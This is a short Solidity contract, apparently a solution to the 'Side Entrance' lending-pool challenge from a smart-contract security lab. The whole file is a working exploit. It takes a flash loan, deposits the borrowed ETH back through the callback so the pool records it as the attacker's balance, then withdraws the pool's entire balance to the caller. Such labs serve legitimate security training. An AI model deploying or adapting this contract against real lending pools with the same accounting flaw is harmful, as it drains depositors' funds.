pragma solidity ^0.8.0;


interface ILender {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}


contract SideEntranceLenderPoolExploit {

    ILender internal lender;

    constructor(address _lender) {
        lender = ILender(_lender);
    }

    function attack() external {
        // Attack: update balances using `deposit` during flashloan,
        // Then pull all balances
        uint256 balance = address(lender).balance;
        lender.flashLoan(balance);

        lender.withdraw();
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Sending ETH failed!");
    }

    function execute() external payable {
        lender.deposit{value: msg.value}();
    }

    receive() external payable {}
}
